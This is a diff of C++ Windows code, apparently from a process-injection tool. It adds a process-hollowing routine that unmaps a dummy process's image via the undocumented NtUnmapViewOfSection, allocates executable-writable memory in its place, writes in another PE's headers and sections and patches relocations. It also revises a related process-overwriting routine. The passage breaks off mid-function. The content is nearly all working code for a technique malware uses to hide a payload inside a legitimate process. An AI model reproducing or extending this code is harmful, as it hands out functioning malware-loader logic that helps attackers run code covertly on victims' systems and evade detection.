@@ -7,6 +7,32 @@
 #include "PE.h"
 #include "GetInfo.h"
 
+
+////////////////////////////////////////////////////
+//Overwriting
+//1. Change Dest mem Protect to RW
+//2. Write Source Header to Dest(Overwrite)
+//3. Write Source sections to Dest(Overwrite)
+//4. Relocation Patching
+//5. Patch Section protections
+//6. Resume Thread
+
+//Hollowing
+//1. Unmap Dest
+//2. Alloc memory for source in dest
+//3. Write Source Headers
+//4. Write Source sections
+//5. Relocation Patching
+//6. Resume Thread
+////////////////////////////////////////////////////
+
+// DECLARING FUNCTION (UNDOCUMENTED WINDOWS LIB)
+using pNtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE hProcess, PVOID pBaseAddress);
+pNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;
+
+
+
+
 // Inject Source PE Header into Destination
 bool WritePEHeader(
     bool is64Bit,
@@ -244,7 +270,7 @@ bool PatchSectionProtections
     return true; // Return true if all protections were applied successfully
 }
 
-PROCESS_INFORMATION OverwriteProcess(NewPEInfo& srcPEInfo, PROCESS_INFORMATION destProcessInfo, PVOID& destImageBase, SIZE_T DestImageSize)
+PROCESS_INFORMATION ProcessOverwriting(NewPEInfo& srcPEInfo, PROCESS_INFORMATION destProcessInfo, PVOID& destImageBase, SIZE_T DestImageSize)
 {
     SIZE_T ulSrcImageSize = is64Bit
         ? srcPEInfo.pNtHeaders64->OptionalHeader.SizeOfImage
@@ -263,10 +289,6 @@ PROCESS_INFORMATION OverwriteProcess(NewPEInfo& srcPEInfo, PROCESS_INFORMATION d
         ? srcPEInfo.pNtHeaders64->OptionalHeader.ImageBase
         : srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase);
 
-    SIZE_T bytesRead = NULL;
-    SIZE_T dwBytesWritten = 0;
-    DWORD oldProtect = 0; // Variable to store the old protection
-
 	// CHANGE SOURCE'S IMAGE BASE TO DESTINATION'S IMAGE BASE
     if (is64Bit)
     {
@@ -276,6 +298,10 @@ PROCESS_INFORMATION OverwriteProcess(NewPEInfo& srcPEInfo, PROCESS_INFORMATION d
     {
         srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase = (DWORD)destImageBase;
     }
+
+    SIZE_T bytesRead = NULL;
+    SIZE_T dwBytesWritten = 0;
+    DWORD oldProtect = 0; // Variable to store the old protection
 
     //1. CHANGE DESTINATION PROCESS REGION'S MEMORY PROTECTION TO RW
     if (!VirtualProtectEx(destProcessInfo.hProcess, destImageBase, DestImageSize, PAGE_READWRITE, &oldProtect))
@@ -310,6 +336,92 @@ PROCESS_INFORMATION OverwriteProcess(NewPEInfo& srcPEInfo, PROCESS_INFORMATION d
     if (!PatchSectionProtections(destProcessInfo.hProcess,srcPEInfo.pDosHeader,destImageBase,srcPEInfo.pFileData.get(),wSrcNumberOfSections,ulSrcImageSize))
     {
         fprintf(stderr, "Failed to patch section protections.\n");
+        exit(-1);
+    }
+
+    return destProcessInfo;
+}
+
+
+PROCESS_INFORMATION ProcessHollowing(NewPEInfo& srcPEInfo, PROCESS_INFORMATION destProcessInfo, PVOID& destImageBase, SIZE_T DestImageSize)
+{
+    SIZE_T ulSrcImageSize = is64Bit
+        ? srcPEInfo.pNtHeaders64->OptionalHeader.SizeOfImage
+        : srcPEInfo.pNtHeaders32->OptionalHeader.SizeOfImage;
+
+    ULONGLONG dwSrcHeaderSize = is64Bit
+        ? srcPEInfo.pNtHeaders64->OptionalHeader.SizeOfHeaders
+        : srcPEInfo.pNtHeaders32->OptionalHeader.SizeOfHeaders;
+
+    WORD wSrcNumberOfSections = is64Bit
+        ? srcPEInfo.pNtHeaders64->FileHeader.NumberOfSections
+        : srcPEInfo.pNtHeaders32->FileHeader.NumberOfSections;
+
+    // GET DELTA BETWEEN STARTING ADDRESS OF DUMMY PROCESS AND STARTING ADDRESS OF SOURCE'S PREFERRED ADDRESS (For part 6)
+    ULONGLONG deltaImageBase = (ULONG_PTR)destImageBase - (is64Bit
+        ? srcPEInfo.pNtHeaders64->OptionalHeader.ImageBase
+        : srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase);
+
+    // CHANGE SOURCE'S IMAGE BASE TO DESTINATION'S IMAGE BASE
+    if (is64Bit)
+    {
+        srcPEInfo.pNtHeaders64->OptionalHeader.ImageBase = (ULONG_PTR)destImageBase;
+    }
+    else
+    {
+        srcPEInfo.pNtHeaders32->OptionalHeader.ImageBase = (DWORD)destImageBase;
+    }
+
+    SIZE_T bytesRead = NULL;
+    SIZE_T dwBytesWritten = 0;
+    DWORD oldProtect = 0; // Variable to store the old protection
+
+    //1. UNMAP VIEW OF DUMMY PROCESS (BASICALLY NULL ALL THE BYTES BELONGING TO THE PROCESS)
+    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
+        GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
+    if (NtUnmapViewOfSection == nullptr)
+    {
+        fprintf(stderr, "Could not locate NtUnmapViewOfSection.\n");
+        exit(-1);
+    }
+    NTSTATUS ntStatus = NtUnmapViewOfSection(destProcessInfo.hProcess, destImageBase);
+    if (!NT_SUCCESS(ntStatus))
+    {
+        fprintf(stderr, "Could not unmap view of dummy process. Nt Status = %X\n",
+            ntStatus);
+        exit(-1);
+    }
+
+    //2. ALLOCATE MEMORY FOR SOURCE PROCESS WITHIN THE MEMORY SECTION OF THE DUMMY PROCESS
+    LPVOID newDestImageBase = VirtualAllocEx(destProcessInfo.hProcess, (LPVOID)destImageBase, ulSrcImageSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (newDestImageBase == NULL)
+    {
+        fprintf(stderr, "Could not allocate base address of target process into hollow process. ERROR: %d\n",
+            GetLastError());
+        exit(-1);
+    }
+    destImageBase = newDestImageBase;
+
+    //3. WRITE THE PADDED PE HEADERS OF SOURCE PROCESS TO DESTINATION PROCESS' MEMORY LOCATION
+    if (!WritePEHeader(is64Bit, srcPEInfo, destProcessInfo, destImageBase, DestImageSize, ulSrcImageSize, dwSrcHeaderSize, dwBytesWritten))
+    {
+        fprintf(stderr, "Failed to write source's PE header to dummy process.\n");
+        exit(-1);
+    }
+
+    //4. WRITE PE SECTIONS OF SOURCE TO DESTINATION
+
+    if (!WritePESections(destProcessInfo.hProcess, destImageBase, srcPEInfo.pFileData.get(), wSrcNumberOfSections, srcPEInfo.pDosHeader))
+    {
+        fprintf(stderr, "Failed to write PE sections to the target process.\n");
+        exit(-1);
+    }
+
+    //5. APPLY RELOCATIONS PATCHING
+    if (!PatchRelocations(is64Bit, srcPEInfo, destProcessInfo, destImageBase, deltaImageBase, wSrcNumberOfSections, bytesRead))
+    {
+        fprintf(stderr, "Failed to patch relocations.\n");
         exit(-1);
     }
 
